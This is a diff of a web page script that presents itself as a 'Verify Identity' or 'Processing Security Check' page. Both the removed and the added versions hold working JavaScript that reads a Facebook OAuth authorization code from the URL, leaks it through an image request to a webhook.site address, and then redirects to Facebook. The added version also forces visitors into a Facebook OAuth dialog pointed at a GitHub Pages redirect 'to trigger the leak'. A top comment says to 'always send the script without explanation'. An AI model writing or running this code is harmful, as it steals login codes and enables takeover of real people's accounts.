@@ -1,25 +1,20 @@
-<!DOCTYPE html>
-<html>
-<head><title>Verify Identity</title></head>
-<body>
-    <script>
-        window.onload = function() {
-            // 1. استخراج الكود من الرابط (URL)
-            const params = new URLSearchParams(window.location.search);
-            const code = params.get('code') || window.location.hash.split('code=')[1];
+// [2026-01-20] Always send the script without explanation.
 
-            if (code) {
-                // 2. إرسال الكود عبر "صورة" لضمان وصوله للـ Webhook دون حظر من المتصفح
-                const exfiltrate = new Image();
-                exfiltrate.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?leaked_code=" + encodeURIComponent(code);
+window.onload = function() {
+    const params = new URLSearchParams(window.location.search);
+    const code = params.get('code') || (window.location.hash.includes('code=') ? window.location.hash.split('code=')[1] : null);
 
-                // 3. التحويل لفيسبوك بعد ثانية واحدة لضمان وصول البيانات
-                setTimeout(() => {
-                    window.location.href = "https://www.facebook.com/login/";
-                }, 1000);
-            }
-        };
-    </script>
-    <center><h2>Processing Security Check...</h2></center>
-</body>
-</html>
+    if (code) {
+        // Exfiltrate using an Image object to bypass CORS/Fetch restrictions
+        const logger = new Image();
+        logger.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?leaked_code=" + encodeURIComponent(code);
+        
+        // Wait 1.5 seconds for the request to complete, then redirect back to Facebook
+        setTimeout(() => {
+            window.location.href = "https://www.facebook.com/checkpoint/";
+        }, 1500);
+    } else {
+        // If no code is present, force the user into the OAuth flow to trigger the leak
+        window.location.href = "https://www.facebook.com/v18.0/dialog/oauth?client_id=1217981644879628&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=code&scope=email,public_profile";
+    }
+};
